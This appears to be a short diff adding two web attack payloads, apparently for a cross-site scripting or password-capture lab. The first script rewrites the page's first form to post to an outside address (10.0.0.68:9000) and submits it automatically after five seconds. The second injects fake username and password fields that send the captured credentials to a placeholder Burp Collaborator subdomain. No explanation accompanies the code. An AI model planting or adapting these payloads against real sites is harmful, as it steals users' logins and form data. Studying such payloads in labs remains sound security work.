@@ -1,0 +1,19 @@
+<script>
+    window.setTimeout(function () {
+    document.forms[0].action = "http://10.0.0.68:9000/";
+    document.forms[0].submit();
+    }, 5000);  // wait 5 sec 
+</script>
+
+
+
+<!-- script 2 -->
+<b>Username:</><br>
+<input name=username id=username>
+<b>Password:</><br>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
